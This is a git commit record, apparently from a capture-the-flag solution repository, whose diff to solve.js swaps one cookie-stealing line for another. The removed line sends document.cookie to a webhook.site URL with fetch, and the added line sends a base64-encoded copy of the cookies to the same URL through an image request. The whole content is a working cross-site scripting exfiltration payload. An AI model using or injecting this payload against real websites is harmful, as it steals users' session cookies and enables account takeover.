787ea35983a5b21b1dd7b915dfe699e22ed5f6ed
doodlebob-bro <ksgill28@gmail.com>
2024-10-25 14:55:55 -0500

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/d9eb65fb-44e5-4031-8aa1-85c636ad63e2?c=' + document.cookie)  
+x = new Image(); x.src = 'https://webhook.site/d9eb65fb-44e5-4031-8aa1-85c636ad63e2?data='+btoa(document.cookie);
